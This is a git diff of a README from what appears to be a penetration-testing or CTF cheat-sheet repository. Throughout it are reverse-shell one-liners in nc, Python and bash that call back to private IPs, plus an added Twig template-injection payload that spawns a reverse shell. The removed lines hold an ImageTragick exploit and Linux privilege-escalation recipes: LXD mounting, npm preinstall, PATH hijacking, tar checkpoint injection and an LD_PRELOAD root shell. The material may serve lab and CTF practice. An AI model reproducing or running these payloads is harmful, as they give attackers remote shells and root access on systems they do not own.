@@ -15,30 +15,24 @@ In this repository, you will find a compilation of various tricks, commands, and
 ```nc
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
 ```
+
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
+
 ```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
+
 ```bash
 bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
 ```
-<details><summary>CVE-2016–3714</summary>
 
+```js
+{{this.controller.getTwig().registerUndefinedFilterCallback("passthru")}}
+{{ this.controller.getTwig().getFilter("bash -c 'bash -i >& /dev/tcp/10.127.255.241/4455 0>&1'") }}
 ```
-cat > image.png << EOF
-push graphic-context
-encoding "UTF-8"
-viewbox 0 0 1 1
-affine 1 0 0 1 0 0
-push graphic-context
-image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
-pop graphic-context
-pop graphic-context
-EOF
-```
-</details>
+
 
 ---
 #### File Transfer on `Netcat`
@@ -58,81 +52,8 @@ scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 
 ---
 ### Linux Privilege Escalation:
-<details><summary> LXD container exploitation </summary> 
 
-```bash
-wget archive
-lxc image import ./archive --alias myimage
-lxc image list
-lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
-lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
-lxc start ignite
-lxc exec ignite /bin/sh
-```
-</details>
-<details><summary> with doas </summary>
-
-```bash
-doas -u root openssl enc -in file
-doas -u root /bin/bash
-```
-</details>
-<details><summary> with npm -u </summary>
-
-```bash
-mkdir ~/tmp
-echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
-sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
-```
-</details>
-
-<details><summary>PATH</summary>
-
-```bash
-echo /bin/sh > curl
-chmod 777 curl
-export PATH=/tmp:$PATH
-./app_that_calls_curl
-```
-
-</details>
-
-<details><summary>tar</summary>
-
-```bash
-cat > /home/andre/backup/rev << EOF
-#!/bin/bash
-rm /tmp/f
-mkfifo /tmp/f
-cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
-EOF
-echo "" > "/home/andre/backup/--checkpoint=1"
-echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
-chmod +x rev
-```
-</details>
-
-<details><summary>env_keep += LD_PRELOAD</summary>
-
-```
-cd /tmp
-cat > shell.c << EOF
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/sh");
-}
-EOF
-gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
-```
-
-</details>
-
+[other](./other/src/linux_priv_esc.md)
 #### information gathering
 ```bash
 cat /proc/version
